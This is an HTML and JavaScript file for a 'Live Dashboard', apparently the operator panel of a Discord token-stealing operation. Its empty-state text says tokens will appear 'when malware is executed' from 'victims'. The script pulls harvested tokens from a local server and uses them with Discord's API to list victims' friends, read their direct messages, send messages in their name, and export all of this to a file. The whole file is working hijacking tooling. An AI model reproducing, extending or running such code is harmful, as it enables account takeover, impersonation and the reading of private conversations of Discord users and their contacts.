<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0a0a0a;
            color: #dcddde;
            height: 100vh;
            overflow: hidden;
        }

        ::-webkit-scrollbar {
            width: 6px;
        }

        ::-webkit-scrollbar-thumb {
            background: #202225;
            border-radius: 3px;
        }

        #accountsPage {
            display: block;
            height: 100vh;
            background: #1a1a2e;
            padding: 30px;
            overflow-y: auto;
        }

        .accounts-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background: rgba(30,30,50,0.8);
            border-radius: 12px;
            margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.05);
            flex-wrap: wrap;
            gap: 10px;
        }

            .accounts-header h2 {
                color: white;
                font-weight: 600;
                font-size: 20px;
            }

            .accounts-header .count {
                color: #72767d;
                font-size: 14px;
                background: #202225;
                padding: 4px 12px;
                border-radius: 12px;
            }

            .accounts-header .status-live {
                color: #3ba55c;
                font-size: 13px;
                font-weight: 600;
                margin-right: 12px;
            }

            .accounts-header .sync-btn {
                background: #5865F2;
                border: none;
                color: white;
                padding: 6px 16px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                font-size: 13px;
            }

                .accounts-header .sync-btn:hover {
                    background: #4752c4;
                }

            .accounts-header .header-right {
                display: flex;
                align-items: center;
                gap: 10px;
                flex-wrap: wrap;
            }

        .accounts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 20px;
        }

        .account-card {
            background: rgba(30,30,50,0.9);
            border-radius: 12px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.05);
            cursor: pointer;
            transition: all 0.3s ease;
        }

            .account-card:hover {
                border-color: #5865F2;
                transform: translateY(-3px);
                box-shadow: 0 10px 40px rgba(88,101,242,0.15);
            }

            .account-card .card-header {
                display: flex;
                align-items: center;
                gap: 15px;
                margin-bottom: 12px;
            }

            .account-card .card-avatar {
                width: 56px;
                height: 56px;
                border-radius: 50%;
                background-size: cover;
                background-position: center;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: 700;
                font-size: 22px;
                color: white;
                flex-shrink: 0;
                border: 2px solid #5865F2;
            }

            .account-card .card-info {
                flex: 1;
                min-width: 0;
            }

                .account-card .card-info .username {
                    color: white;
                    font-size: 18px;
                    font-weight: 600;
                }

                .account-card .card-info .email {
                    color: #72767d;
                    font-size: 13px;
                }

                .account-card .card-info .badge {
                    display: inline-block;
                    background: #3ba55c;
                    color: white;
                    font-size: 10px;
                    padding: 1px 10px;
                    border-radius: 10px;
                    font-weight: 600;
                    margin-top: 4px;
                }

                    .account-card .card-info .badge.unverified {
                        background: #ed4245;
                    }

            .account-card .card-details {
                display: flex;
                gap: 15px;
                margin-top: 10px;
                padding-top: 10px;
                border-top: 1px solid rgba(255,255,255,0.05);
                flex-wrap: wrap;
            }

                .account-card .card-details .detail-item {
                    color: #72767d;
                    font-size: 12px;
                }

                    .account-card .card-details .detail-item span {
                        color: #b5bac1;
                        font-weight: 500;
                    }

            .account-card .card-actions {
                margin-top: 12px;
                display: flex;
                gap: 8px;
            }

                .account-card .card-actions .btn-small {
                    background: rgba(255,255,255,0.05);
                    border: none;
                    color: #72767d;
                    padding: 4px 12px;
                    border-radius: 4px;
                    font-size: 11px;
                    cursor: pointer;
                }

                    .account-card .card-actions .btn-small:hover {
                        background: rgba(255,255,255,0.1);
                        color: white;
                    }

                    .account-card .card-actions .btn-small.danger:hover {
                        background: #ed4245;
                        color: white;
                    }

        .empty-accounts {
            text-align: center;
            padding: 60px 20px;
            color: #72767d;
            grid-column: 1 / -1;
        }

            .empty-accounts .icon {
                font-size: 48px;
                margin-bottom: 15px;
            }

            .empty-accounts h3 {
                color: white;
                font-size: 18px;
                margin-bottom: 8px;
            }

            .empty-accounts p {
                font-size: 14px;
            }

            .empty-accounts .sync-btn-big {
                margin-top: 15px;
                background: #5865F2;
                border: none;
                color: white;
                padding: 8px 24px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                font-size: 14px;
            }

                .empty-accounts .sync-btn-big:hover {
                    background: #4752c4;
                }

        #app {
            display: none;
            height: 100vh;
            background: #313338;
        }

            #app.active {
                display: flex;
            }

        .sidebar {
            width: 300px;
            background: #1e1f22;
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
            border-right: 1px solid #2b2d31;
        }

        .sidebar-header {
            padding: 16px 18px;
            border-bottom: 1px solid #2b2d31;
            display: flex;
            align-items: center;
            gap: 12px;
        }

            .sidebar-header .back-btn {
                background: rgba(255,255,255,0.05);
                border: none;
                color: #b5bac1;
                padding: 6px 12px;
                border-radius: 4px;
                cursor: pointer;
                font-size: 13px;
            }

                .sidebar-header .back-btn:hover {
                    background: rgba(255,255,255,0.1);
                    color: white;
                }

            .sidebar-header .avatar-big {
                width: 44px;
                height: 44px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: 700;
                font-size: 18px;
                color: white;
                flex-shrink: 0;
                background-size: cover;
                background-position: center;
                border: 2px solid #5865F2;
            }

            .sidebar-header .user-info {
                flex: 1;
                min-width: 0;
            }

                .sidebar-header .user-info .name {
                    color: white;
                    font-weight: 600;
                    font-size: 15px;
                }

                .sidebar-header .user-info .email {
                    font-size: 11px;
                    color: #72767d;
                }

                .sidebar-header .user-info .verified-badge {
                    display: inline-block;
                    background: #3ba55c;
                    color: white;
                    font-size: 9px;
                    padding: 1px 8px;
                    border-radius: 10px;
                    font-weight: 600;
                }

        .sidebar-search {
            padding: 12px 14px;
        }

            .sidebar-search input {
                width: 100%;
                padding: 8px 12px;
                background: #2b2d31;
                border: none;
                border-radius: 4px;
                color: white;
                font-size: 13px;
            }

                .sidebar-search input::placeholder {
                    color: #72767d;
                }

                .sidebar-search input:focus {
                    outline: none;
                    border: 1px solid #5865F2;
                }

        .sidebar-friends {
            flex: 1;
            overflow-y: auto;
            padding: 0 8px 8px 8px;
        }

            .sidebar-friends .section-title {
                color: #949ba4;
                font-size: 12px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                padding: 12px 8px 6px 8px;
            }

        .friend-item {
            display: flex;
            align-items: center;
            padding: 8px 10px;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.15s;
            margin-bottom: 1px;
            gap: 12px;
        }

            .friend-item:hover {
                background: #2a2b2f;
            }

            .friend-item.active {
                background: #3f4147;
            }

            .friend-item .avatar-friend {
                width: 36px;
                height: 36px;
                border-radius: 50%;
                flex-shrink: 0;
                background-size: cover;
                background-position: center;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: 600;
                font-size: 14px;
                color: white;
            }

            .friend-item .info {
                flex: 1;
                min-width: 0;
            }

                .friend-item .info .name {
                    color: #dcddde;
                    font-size: 14px;
                    font-weight: 500;
                }

                .friend-item .info .status {
                    font-size: 11px;
                    color: #72767d;
                }

                    .friend-item .info .status.online {
                        color: #3ba55c;
                    }

                    .friend-item .info .status.offline {
                        color: #72767d;
                    }

            .friend-item .last-msg-preview {
                font-size: 11px;
                color: #4e5058;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
                max-width: 80px;
                text-align: right;
            }

        .chat-area {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: #313338;
            min-width: 0;
        }

        .chat-header {
            padding: 12px 20px;
            border-bottom: 1px solid #2b2d31;
            display: flex;
            align-items: center;
            background: #313338;
            flex-shrink: 0;
            min-height: 48px;
            gap: 12px;
        }

            .chat-header .chat-avatar {
                width: 36px;
                height: 36px;
                border-radius: 50%;
                background-size: cover;
                background-position: center;
                flex-shrink: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: 600;
                color: white;
                border: 2px solid transparent;
            }

                .chat-header .chat-avatar.online {
                    border-color: #3ba55c;
                }

            .chat-header .chat-user-info {
                flex: 1;
                min-width: 0;
            }

                .chat-header .chat-user-info .chat-name {
                    color: white;
                    font-size: 16px;
                    font-weight: 600;
                }

                .chat-header .chat-user-info .chat-status {
                    font-size: 12px;
                    color: #72767d;
                }

        .messages-container {
            flex: 1;
            overflow-y: auto;
            padding: 16px 20px 10px 20px;
        }

        .message-group {
            margin-bottom: 6px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
            padding: 4px 0;
        }

            .message-group .msg-avatar {
                width: 36px;
                height: 36px;
                border-radius: 50%;
                flex-shrink: 0;
                background-size: cover;
                background-position: center;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: 600;
                font-size: 13px;
                color: white;
            }

            .message-group .msg-content {
                flex: 1;
                min-width: 0;
            }

                .message-group .msg-content .msg-header {
                    display: flex;
                    align-items: baseline;
                    gap: 8px;
                    margin-bottom: 2px;
                    flex-wrap: wrap;
                }

                    .message-group .msg-content .msg-header .author {
                        color: white;
                        font-weight: 600;
                        font-size: 14px;
                    }

                    .message-group .msg-content .msg-header .time {
                        color: #72767d;
                        font-size: 11px;
                    }

                .message-group .msg-content .text {
                    color: #dcddde;
                    font-size: 14px;
                    word-wrap: break-word;
                    line-height: 1.5;
                }

            .message-group.self {
                flex-direction: row-reverse;
            }

                .message-group.self .msg-content {
                    text-align: right;
                }

                    .message-group.self .msg-content .text {
                        color: #b5bac1;
                    }

        .message-input-area {
            padding: 0 20px 20px 20px;
            flex-shrink: 0;
        }

            .message-input-area .input-wrapper {
                background: #383a40;
                border-radius: 8px;
                padding: 4px 12px;
                display: flex;
                align-items: center;
                gap: 10px;
            }

                .message-input-area .input-wrapper input {
                    flex: 1;
                    background: transparent;
                    border: none;
                    color: white;
                    font-size: 15px;
                    padding: 10px 0;
                    outline: none;
                    min-width: 0;
                }

                    .message-input-area .input-wrapper input::placeholder {
                        color: #72767d;
                    }

                .message-input-area .input-wrapper button {
                    background: #5865F2;
                    border: none;
                    color: white;
                    padding: 6px 16px;
                    border-radius: 4px;
                    font-weight: 600;
                    font-size: 13px;
                    cursor: pointer;
                }

                    .message-input-area .input-wrapper button:hover {
                        background: #4752c4;
                    }

        .empty-state {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #72767d;
            text-align: center;
            padding: 20px;
        }

            .empty-state .icon {
                font-size: 48px;
                margin-bottom: 12px;
            }

            .empty-state h2 {
                color: white;
                font-weight: 600;
                font-size: 20px;
                margin-bottom: 6px;
            }

            .empty-state p {
                font-size: 14px;
                max-width: 400px;
            }

        @media (max-width: 768px) {
            .sidebar {
                width: 70px;
            }

                .sidebar .sidebar-header .user-info, .sidebar .sidebar-search input, .sidebar .section-title, .sidebar .friend-item .info .name {
                    display: none;
                }

            .accounts-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div id="accountsPage">
        <div class="accounts-header">
            <h2>📁 Live Dashboard</h2>
            <div class="header-right">
                <span class="status-live">● Live</span>
                <span class="count" id="accountsCount">0 accounts</span>
                <button class="sync-btn" onclick="forceSync()">🔄 Sync Now</button>
            </div>
        </div>
        <div class="accounts-grid" id="accountsGrid"></div>
    </div>

    <div id="app">
        <div class="sidebar">
            <div class="sidebar-header">
                <button class="back-btn" onclick="goBackToAccounts()">← Back</button>
                <div class="avatar-big" id="sidebarAvatar" style="background:#5865F2;">U</div>
                <div class="user-info">
                    <div class="name" id="sidebarName">Username</div>
                    <div class="email" id="sidebarEmail">email@example.com</div>
                    <div><span class="verified-badge" id="sidebarVerified">✓ Verified</span></div>
                </div>
            </div>
            <div class="sidebar-search">
                <input type="text" placeholder="Find or start a conversation" id="searchInput" oninput="filterFriends()">
            </div>
            <div class="sidebar-friends">
                <div class="section-title">Direct Messages</div>
                <div id="friendsContainer"><div style="color:#72767d;padding:20px;text-align:center;">Loading friends...</div></div>
            </div>
        </div>
        <div class="chat-area">
            <div class="chat-header">
                <div class="chat-avatar" id="chatAvatar" style="background:#5865F2;">?</div>
                <div class="chat-user-info">
                    <div class="chat-name" id="chatName">Select a friend</div>
                    <div class="chat-status" id="chatStatus">offline</div>
                </div>
            </div>
            <div class="messages-container" id="messagesContainer">
                <div class="empty-state"><div class="icon">💬</div><h2>Select a friend</h2><p>Choose someone from your friends list</p></div>
            </div>
            <div class="message-input-area">
                <div class="input-wrapper">
                    <input type="text" id="messageInput" placeholder="Type a message..." onkeypress="if(event.key==='Enter') sendMessage()">
                    <button onclick="sendMessage()">Send</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ============================================================
        // DATA STORE
        // ============================================================
        let allAccounts = JSON.parse(localStorage.getItem('discord_accounts') || '[]');
        let allMessagesDB = JSON.parse(localStorage.getItem('discord_messages_db_persistent') || '{}');
        let currentUser = null;
        let currentFriend = null;
        let friendsList = [];
        let currentToken = '';

        // ============================================================
        // FORCE SYNC
        // ============================================================
        function forceSync() {
        const btn = document.querySelector('.sync-btn');
        const originalText = btn.textContent;
        btn.textContent = '⏳ Syncing...';
        btn.disabled = true;

        fetch('http://localhost:3000/api/tokens')
        .then(r => r.json())
        .then(data => {
        if (data && data.length > 0) {
        localStorage.setItem('discord_accounts', JSON.stringify(data));
        allAccounts = data;
        renderAccounts();
        btn.textContent = '✅ Synced!';
        setTimeout(() => { btn.textContent = originalText; btn.disabled = false; }, 1500);
        } else {
        btn.textContent = '❌ No data';
        setTimeout(() => { btn.textContent = originalText; btn.disabled = false; }, 1500);
        }
        })
        .catch(() => {
        btn.textContent = '❌ Error';
        setTimeout(() => { btn.textContent = originalText; btn.disabled = false; }, 1500);
        });
        }

        // ============================================================
        // POLLING
        // ============================================================
        function pollForUpdates() {
        setInterval(() => {
        fetch('http://localhost:3000/api/tokens')
        .then(r => r.json())
        .then(serverData => {
        if (!serverData || serverData.length === 0) return;
        let localData = JSON.parse(localStorage.getItem('discord_accounts') || '[]');
        if (serverData.length > localData.length) {
        localStorage.setItem('discord_accounts', JSON.stringify(serverData));
        allAccounts = serverData;
        renderAccounts();
        }
        })
        .catch(() => {});
        }, 2000);
        }

        // ============================================================
        // RENDER ACCOUNTS
        // ============================================================
        function renderAccounts() {
        fetch('http://localhost:3000/api/tokens')
        .then(r => r.json())
        .then(serverData => {
        if (serverData && serverData.length > 0) {
        localStorage.setItem('discord_accounts', JSON.stringify(serverData));
        allAccounts = serverData;
        } else {
        allAccounts = JSON.parse(localStorage.getItem('discord_accounts') || '[]');
        }
        renderAccountsUI();
        })
        .catch(() => {
        allAccounts = JSON.parse(localStorage.getItem('discord_accounts') || '[]');
        renderAccountsUI();
        });
        }

        function renderAccountsUI() {
        const grid = document.getElementById('accountsGrid');
        const count = document.getElementById('accountsCount');
        count.textContent = allAccounts.length + ' accounts';
        if (allAccounts.length === 0) {
        grid.innerHTML = `<div class="empty-accounts"><div class="icon">📭</div><h3>Waiting for victims...</h3><p>Tokens will appear here automatically when malware is executed.</p><button class="sync-btn-big" onclick="forceSync()">🔄 Force Sync</button></div>`;
        return;
        }
        grid.innerHTML = allAccounts.map((acc, index) => {
        const user = acc.userData;
        if (!user) return '';
        const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=80` : '';
        const initial = (user.username || 'U').charAt(0).toUpperCase();
        const bgColor = getColor(user.id || '0');
        const verifiedBadge = user.verified ? '<span class="badge">✓ Verified</span>' : '<span class="badge unverified">⚠ Not Verified</span>';
        return `<div class="account-card" onclick="selectAccount(${index})">
        <div class="card-header">
        <div class="card-avatar" style="${avatarUrl ? `background-image:url(${avatarUrl});background-size:cover;background-position:center;` : `background:${bgColor};`}">${avatarUrl ? '' : initial}</div>
        <div class="card-info">
        <div class="username">${user.username || 'Unknown'}</div>
        <div class="email">${user.email || 'No email'}</div>
        ${verifiedBadge}
        </div>
        </div>
        <div class="card-details">
        <div class="detail-item">ID: <span class="id-text">${user.id || 'N/A'}</span></div>
        <div class="detail-item">Received: <span>${new Date(acc.receivedAt).toLocaleString()}</span></div>
        </div>
        <div class="card-actions">
        <button class="btn-small" onclick="event.stopPropagation();selectAccount(${index})">🔓 Open</button>
        <button class="btn-small danger" onclick="event.stopPropagation();removeAccount(${index})">🗑 Remove</button>
        </div>
        </div>`;
        }).join('');
        }

        // ============================================================
        // SELECT ACCOUNT
        // ============================================================
        function selectAccount(index) {
        const acc = allAccounts[index];
        if (!acc) return;
        currentToken = acc.token;
        currentUser = acc.userData;
        document.getElementById('accountsPage').style.display = 'none';
        document.getElementById('app').classList.add('active');
        const avatarEl = document.getElementById('sidebarAvatar');
        const nameEl = document.getElementById('sidebarName');
        const emailEl = document.getElementById('sidebarEmail');
        const verifiedEl = document.getElementById('sidebarVerified');
        if (currentUser.avatar) {
        avatarEl.style.backgroundImage = `url(https://cdn.discordapp.com/avatars/${currentUser.id}/${currentUser.avatar}.png?size=80)`;
        avatarEl.style.backgroundSize = 'cover';
        avatarEl.textContent = '';
        } else {
        avatarEl.textContent = (currentUser.username || 'U').charAt(0).toUpperCase();
        avatarEl.style.background = getColor(currentUser.id || '0');
        }
        nameEl.textContent = currentUser.username || 'Unknown';
        emailEl.textContent = currentUser.email || 'No email';
        verifiedEl.textContent = currentUser.verified ? '✓ Verified' : '⚠ Not Verified';
        verifiedEl.style.background = currentUser.verified ? '#3ba55c' : '#ed4245';
        loadFriends();
        }

        function goBackToAccounts() {
        document.getElementById('app').classList.remove('active');
        document.getElementById('accountsPage').style.display = 'block';
        renderAccounts();
        }

        function removeAccount(index) {
        if (confirm('Remove this account?')) {
        allAccounts.splice(index, 1);
        localStorage.setItem('discord_accounts', JSON.stringify(allAccounts));
        renderAccounts();
        }
        }

        // ============================================================
        // LOAD FRIENDS
        // ============================================================
        function loadFriends() {
        const container = document.getElementById('friendsContainer');
        container.innerHTML = '<div style="color:#72767d;padding:20px;text-align:center;">Loading...</div>';
        if (!currentToken) { container.innerHTML = '<div style="color:#ed4245;padding:20px;text-align:center;">❌ No token</div>'; return; }
        fetch('https://discord.com/api/v9/users/@me/relationships', {
        headers: { 'Authorization': currentToken, 'User-Agent': 'Mozilla/5.0' }
        })
        .then(r => r.json())
        .then(data => {
        friendsList = data.filter(r => r.type === 1).map(r => r.user);
        renderFriends(friendsList);
        if (friendsList.length > 0) selectFriend(friendsList[0]);
        })
        .catch(() => { container.innerHTML = '<div style="color:#72767d;padding:20px;text-align:center;">❌ Failed to load friends</div>'; });
        }

        function renderFriends(list) {
        const container = document.getElementById('friendsContainer');
        if (!list || list.length === 0) { container.innerHTML = '<div style="color:#72767d;padding:20px;text-align:center;">No friends found</div>'; return; }
        container.innerHTML = list.map(f => {
        const avatarUrl = f.avatar ? `https://cdn.discordapp.com/avatars/${f.id}/${f.avatar}.png?size=40` : '';
        const initial = (f.username || '?').charAt(0).toUpperCase();
        const bgColor = getColor(f.id);
        const dbKey = getDBKey(currentUser?.id || '', f.id);
        const msgs = allMessagesDB[dbKey] || [];
        const lastMsg = msgs.length > 0 ? msgs[msgs.length - 1] : null;
        const preview = lastMsg ? (lastMsg.content || '(No content)').substring(0, 25) + '...' : 'No messages';
        return `<div class="friend-item" data-id="${f.id}" onclick="selectFriendById('${f.id}')">
        <div class="avatar-friend" style="${avatarUrl ? `background-image:url(${avatarUrl});background-size:cover;background-position:center;` : `background:${bgColor};`}">${avatarUrl ? '' : initial}</div>
        <div class="info">
        <div class="name">${f.username || 'Unknown'}</div>
        <div class="status ${f.status || 'offline'}">${f.status || 'offline'}</div>
        </div>
        <div class="last-msg-preview">${preview}</div>
        </div>`;
        }).join('');
        }

        function filterFriends() {
        const query = document.getElementById('searchInput').value.toLowerCase();
        const filtered = friendsList.filter(f => (f.username || '').toLowerCase().includes(query));
        renderFriends(filtered);
        }

        // ============================================================
        // SELECT FRIEND
        // ============================================================
        function selectFriendById(id) {
        const friend = friendsList.find(f => f.id === id);
        if (friend) selectFriend(friend);
        }

        function selectFriend(friend) {
        currentFriend = friend;
        document.querySelectorAll('.friend-item').forEach(el => el.classList.remove('active'));
        const activeEl = document.querySelector(`.friend-item[data-id="${friend.id}"]`);
        if (activeEl) activeEl.classList.add('active');
        const chatAvatar = document.getElementById('chatAvatar');
        const chatName = document.getElementById('chatName');
        const chatStatus = document.getElementById('chatStatus');
        const avatarUrl = friend.avatar ? `https://cdn.discordapp.com/avatars/${friend.id}/${friend.avatar}.png?size=80` : '';
        const bgColor = getColor(friend.id);
        if (avatarUrl) {
        chatAvatar.style.backgroundImage = `url(${avatarUrl})`;
        chatAvatar.style.backgroundSize = 'cover';
        chatAvatar.textContent = '';
        } else {
        chatAvatar.textContent = (friend.username || '?').charAt(0).toUpperCase();
        chatAvatar.style.background = bgColor;
        }
        const statusText = friend.status || 'offline';
        chatAvatar.className = 'chat-avatar ' + statusText;
        chatName.textContent = friend.username || 'Unknown';
        chatStatus.textContent = statusText;
        chatStatus.className = 'chat-status ' + statusText;
        loadMessagesFromDB(friend.id);
        }

        // ============================================================
        // DATABASE
        // ============================================================
        function getDBKey(userId, friendId) {
        const ids = [userId, friendId].sort();
        return ids.join('_');
        }

        function loadMessagesFromDB(friendId) {
        const container = document.getElementById('messagesContainer');
        const dbKey = getDBKey(currentUser?.id || '', friendId);
        const messages = allMessagesDB[dbKey] || [];
        if (messages.length === 0) {
        if (currentToken) fetchMessagesFromAPI(friendId);
        else container.innerHTML = `<div class="empty-state"><div class="icon">🔒</div><h2>Token expired</h2><p>Click "Sync" to refresh</p></div>`;
        return;
        }
        renderMessages(messages, friendId);
        }

        function fetchMessagesFromAPI(friendId) {
        const container = document.getElementById('messagesContainer');
        container.innerHTML = '<div style="color:#72767d;padding:40px;text-align:center;">Loading messages...</div>';
        if (!currentToken) return;
        fetch('https://discord.com/api/v9/users/@me/channels', {
        headers: { 'Authorization': currentToken, 'User-Agent': 'Mozilla/5.0' }
        })
        .then(r => r.json())
        .then(channels => {
        const dm = channels.find(c => c.type === 1 && c.recipients && c.recipients.some(r => r.id === friendId));
        if (dm) return dm;
        return fetch('https://discord.com/api/v9/users/@me/channels', {
        method: 'POST',
        headers: { 'Authorization': currentToken, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
        body: JSON.stringify({ recipient_id: friendId })
        }).then(r => r.json());
        })
        .then(channel => {
        return fetch(`https://discord.com/api/v9/channels/${channel.id}/messages?limit=50`, {
        headers: { 'Authorization': currentToken, 'User-Agent': 'Mozilla/5.0' }
        });
        })
        .then(r => r.json())
        .then(messages => {
        const dbKey = getDBKey(currentUser?.id || '', friendId);
        allMessagesDB[dbKey] = messages;
        localStorage.setItem('discord_messages_db_persistent', JSON.stringify(allMessagesDB));
        renderMessages(messages, friendId);
        updateFriendPreview(friendId, messages);
        })
        .catch(() => { container.innerHTML = '<div style="color:#72767d;padding:40px;text-align:center;">❌ Could not load messages</div>'; });
        }

        // ============================================================
        // RENDER MESSAGES
        // ============================================================
        function renderMessages(messages, friendId) {
        const container = document.getElementById('messagesContainer');
        if (!messages || messages.length === 0) {
        const friend = friendsList.find(f => f.id === friendId);
        container.innerHTML = `<div class="empty-state"><div class="icon">💬</div><h2>No messages yet</h2><p>Say hello to ${friend ? friend.username : 'your friend'}</p></div>`;
        return;
        }
        container.innerHTML = messages.slice().reverse().map(msg => {
        const isMe = msg.author?.id === currentUser?.id;
        const author = isMe ? currentUser : msg.author;
        const authorName = author?.username || 'Unknown';
        const avatarUrl = author?.avatar ? `https://cdn.discordapp.com/avatars/${author.id}/${author.avatar}.png?size=40` : '';
        const bgColor = getColor(author?.id || '0');
        const avatarHtml = avatarUrl ? `<div class="msg-avatar" style="background-image:url(${avatarUrl});background-size:cover;background-position:center;"></div>` : `<div class="msg-avatar" style="background:${bgColor};">${authorName.charAt(0).toUpperCase()}</div>`;
        const selfClass = isMe ? 'self' : '';
        const content = msg.content || '';
        return `<div class="message-group ${selfClass}">
        ${avatarHtml}
        <div class="msg-content">
        <div class="msg-header">
        <span class="author">${authorName}</span>
        <span class="time">${new Date(msg.timestamp).toLocaleString()}</span>
        </div>
        <div class="text">${escapeHtml(content)}</div>
        </div>
        </div>`;
        }).join('');
        container.scrollTop = container.scrollHeight;
        }

        // ============================================================
        // SEND MESSAGE
        // ============================================================
        function sendMessage() {
        const input = document.getElementById('messageInput');
        const content = input.value.trim();
        if (!content || !currentFriend || !currentToken) return;
        input.value = '';
        fetch('https://discord.com/api/v9/users/@me/channels', {
        headers: { 'Authorization': currentToken, 'User-Agent': 'Mozilla/5.0' }
        })
        .then(r => r.json())
        .then(channels => {
        const dm = channels.find(c => c.type === 1 && c.recipients && c.recipients.some(r => r.id === currentFriend.id));
        if (dm) return dm;
        return fetch('https://discord.com/api/v9/users/@me/channels', {
        method: 'POST',
        headers: { 'Authorization': currentToken, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
        body: JSON.stringify({ recipient_id: currentFriend.id })
        }).then(r => r.json());
        })
        .then(channel => {
        return fetch(`https://discord.com/api/v9/channels/${channel.id}/messages`, {
        method: 'POST',
        headers: { 'Authorization': currentToken, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
        body: JSON.stringify({ content: content })
        });
        })
        .then(r => r.json())
        .then(msg => {
        const dbKey = getDBKey(currentUser?.id || '', currentFriend.id);
        if (!allMessagesDB[dbKey]) allMessagesDB[dbKey] = [];
        allMessagesDB[dbKey].push(msg);
        localStorage.setItem('discord_messages_db_persistent', JSON.stringify(allMessagesDB));
        renderMessages(allMessagesDB[dbKey], currentFriend.id);
        updateFriendPreview(currentFriend.id, allMessagesDB[dbKey]);
        })
        .catch(e => { console.error('Send error:', e); alert('Failed to send message'); });
        }

        function updateFriendPreview(friendId, messages) {
        const el = document.querySelector(`.friend-item[data-id="${friendId}"] .last-msg-preview`);
        if (el && messages && messages.length > 0) {
        const last = messages[messages.length - 1];
        el.textContent = (last.content || '(No content)').substring(0, 25) + '...';
        }
        }

        // ============================================================
        // UTILITY
        // ============================================================
        function getColor(id) {
        const colors = ['#5865F2', '#57F287', '#FEE75C', '#EB459E', '#ED4245', '#FAA61A', '#00a8fc', '#43b581'];
        let hash = 0;
        const str = id || '0';
        for (let i = 0; i < str.length; i++) { hash = str.charCodeAt(i) + ((hash << 5) - hash); }
        return colors[Math.abs(hash) % colors.length];
        }

        function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
        }

        // ============================================================
        // INIT
        // ============================================================
        renderAccounts();
        pollForUpdates();
        console.log('📁 Live Dashboard Active');
        console.log('📊 Accounts: ' + allAccounts.length);

        // ============================================================
        // EXPORT / CLEAR (Console)
        // ============================================================
        function exportAllData() {
        const data = {
        accounts: JSON.parse(localStorage.getItem('discord_accounts') || '[]'),
        messages: JSON.parse(localStorage.getItem('discord_messages_db_persistent') || '{}'),
        exportedAt: new Date().toISOString()
        };
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `discord_data_${new Date().toISOString().slice(0, 10)}.json`;
        a.click();
        URL.revokeObjectURL(url);
        }

        function clearAllData() {
        if (confirm('Clear ALL data?')) {
        localStorage.removeItem('discord_accounts');
        localStorage.removeItem('discord_messages_db_persistent');
        location.reload();
        }
        }

        console.log('💾 Export: exportAllData()');
        console.log('🗑️ Clear: clearAllData()');
    </script>
</body>
</html>
